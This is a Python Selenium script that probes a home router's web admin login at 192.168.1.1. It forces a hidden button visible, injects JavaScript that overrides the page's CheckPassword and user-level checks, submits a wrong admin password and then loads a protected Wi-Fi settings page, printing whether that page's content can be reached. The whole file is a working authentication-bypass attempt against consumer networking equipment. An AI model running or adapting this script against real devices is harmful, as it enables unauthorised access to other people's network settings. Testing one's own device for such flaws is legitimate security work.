#!/usr/bin/env python3
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

opts = Options()
opts.add_argument("--headless=new")
opts.add_argument("--no-sandbox")
opts.add_argument("--disable-dev-shm-usage")
opts.add_argument("--disable-gpu")
opts.add_argument("--ignore-certificate-errors")
opts.add_argument("--window-size=1280,720")
opts.binary_location = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

driver = webdriver.Chrome(options=opts)
driver.set_page_load_timeout(15)

# Navigate to login
driver.get("https://192.168.1.1/login.asp")
WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "txt_Username")))

# Wait for button
try:
    WebDriverWait(driver, 8).until(lambda d: d.find_element(By.ID, "button").is_displayed())
    print("Button visible")
except:
    driver.execute_script("document.getElementById('button').style.display = '';")
    print("Button forced visible")

# Inject bypasses
driver.execute_script("""
    window.CheckPassword = function() { return 0; };
    window.setDisable = function() {};
    window.DisplayWifiPldt = function() {};
    window.Userlevel = 0;
    window.preflag = 0;
""")

# Check lockout
lockout = driver.execute_script("""
    var el = document.getElementById('loginfail');
    var display = el ? el.style.display : 'no-element';
    var text = el ? el.innerText : '';
    var lockTime = window.LockLeftTime || 0;
    return {display: display, text: text, lockTime: lockTime};
""")
print("Lockout state:", lockout)

# Type wrong password
user_field = driver.find_element(By.ID, "txt_Username")
pass_field = driver.find_element(By.ID, "txt_Password")
driver.execute_script("arguments[0].value = '';", user_field)
driver.execute_script("arguments[0].value = '';", pass_field)
user_field.send_keys("admin")
pass_field.send_keys("wrongpassword")

# Click login
login_btn = driver.find_element(By.ID, "button")
login_btn.click()
time.sleep(3)

print("After click URL:", driver.current_url)
print("After click Title:", driver.title)

# Check loginfail
post_src = driver.page_source
has_login_fail = "loginfail" in post_src
print("Has loginfail:", has_login_fail)

# Navigate to protected page
driver.get("https://192.168.1.1/html/amp/wlanbasic/WlanBasic.asp?2G")
time.sleep(3)
print("Protected URL:", driver.current_url)
print("Protected Title:", driver.title)

prot_src = driver.page_source
print("Has txt_Username:", "txt_Username" in prot_src)
print("Has /wlanbasic/ in URL:", "/wlanbasic/" in driver.current_url.lower())
print("Has Ssid:", "Ssid" in prot_src or "ssid" in prot_src.lower())
print("Has WlanBasic in page:", "WlanBasic" in prot_src)

# Print first 500 chars
print("---SNIPPET---")
print(prot_src[:500])

driver.quit()
